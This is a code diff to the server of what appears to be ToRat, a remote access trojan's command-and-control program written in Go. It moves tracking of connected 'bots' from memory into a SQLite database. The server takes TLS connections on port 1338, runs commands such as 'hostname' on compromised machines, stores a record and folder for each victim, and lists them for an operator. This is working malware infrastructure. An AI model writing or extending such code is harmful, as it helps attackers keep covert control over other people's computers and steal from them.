@@ -3,7 +3,6 @@ package server
 import (
 	"crypto/tls"
 	"fmt"
-	"io/ioutil"
 	"log"
 	"net"
 	"os"
@@ -11,22 +10,25 @@ import (
 	"strconv"
 
 	"github.com/fatih/color"
+	"github.com/jinzhu/gorm"
+	_ "github.com/jinzhu/gorm/dialects/sqlite" //sqlite
 	"github.com/lu4p/ToRat_server/crypto"
 )
 
 const port = ":1338"
 
-var allClients []*client
+var db *gorm.DB
 
-type client struct {
-	Conn     net.Conn
-	Hostname string
-	Name     string
-	Path     string
-}
+var activeClients []activeClient
 
 // Start runs the server
 func Start() {
+	db, _ = gorm.Open("sqlite3", "ToRat.db")
+	defer db.Close()
+
+	// Migrate the schema
+	db.AutoMigrate(&Client{})
+
 	cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
 	if err != nil {
 		log.Println("could not load cert", err)
@@ -51,7 +53,7 @@ func Start() {
 }
 
 func accept(conn net.Conn) {
-	c := new(client)
+	var c activeClient
 	c.Conn = conn
 	encHostname, err := c.runCommandByte("hostname")
 	if err != nil {
@@ -65,28 +67,28 @@ func accept(conn net.Conn) {
 		return
 	}
 	c.Hostname = string(hostname)
-	c.Path = filepath.Join("bots", c.Hostname)
-	if _, err = os.Stat(c.Path); err != nil {
-		os.MkdirAll(c.Path, os.ModePerm)
-	}
-	name, err := ioutil.ReadFile(filepath.Join(c.Path, "alias"))
-	if err != nil {
-		c.Name = c.Hostname
-	}
-	c.Name = string(name)
+	c.Client = &Client{Hostname: string(hostname), Path: filepath.Join("bots", c.Hostname)}
+	db.FirstOrCreate(&c.Client, Client{Hostname: string(hostname)})
+	log.Println("success")
 
-	allClients = append(allClients, c)
-	fmt.Println(green("[+] New Client"), blue(c.Hostname), green("connected!"))
+	if _, err = os.Stat(c.Client.Path); err != nil {
+		os.MkdirAll(c.Client.Path, os.ModePerm)
+	}
+	if c.Client.Name == "" {
+		c.Client.Name = c.Client.Hostname
+	}
+	db.Save(&c.Client)
+	activeClients = append(activeClients, c)
+	fmt.Println(green("[+] New Client"), blue(c.Client.Name), green("connected!"))
 }
 
 func listConn() []string {
 	var clients []string
-	for i, client := range allClients {
-		str := strconv.Itoa(i) + "\t" + client.Hostname + "\t" + client.Name
+	for i, c := range activeClients {
+		str := strconv.Itoa(i) + "\t" + c.Client.Hostname + "\t" + c.Client.Name
 		clients = append(clients, str)
 	}
 	return clients
-
 }
 
 func printClients() {
@@ -95,9 +97,8 @@ func printClients() {
 	for _, client := range list {
 		color.Cyan(client)
 	}
-
 }
 
-func getClient(target int) *client {
-	return allClients[target]
+func getClient(target int) *activeClient {
+	return &activeClients[target]
 }
